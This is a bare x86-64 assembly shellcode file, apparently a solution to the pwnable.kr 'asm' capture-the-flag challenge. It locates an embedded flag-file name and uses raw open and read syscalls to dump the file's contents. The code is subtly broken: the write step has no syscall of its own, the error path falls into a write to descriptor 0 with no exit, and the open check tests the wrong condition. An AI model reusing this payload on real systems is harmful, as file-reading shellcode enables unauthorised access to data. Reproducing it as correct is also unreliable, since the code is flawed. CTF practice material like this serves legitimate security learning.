global _start

section .text

_start:
	jmp filename

open :	
	pop rdi
	xor rsi, rsi
	xor rdx, rsi
	mov rax, 2
	syscall

	test rax, rax 
	jz error

	push rax
	pop rdi 
	mov rdx, 0xff 
	sub rsp, rdx
	mov rsi, rsp 
	xor rax, rax 
	syscall

	mov rdx, rax
	mov rsi, rsp
	mov rdi, 1 
	mov rax, 1 
	
error :
	xor rax, rax
	inc rax
	xor rdi, rdi
	syscall

filename :
	call open 
	.ascii "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
    .byte 0
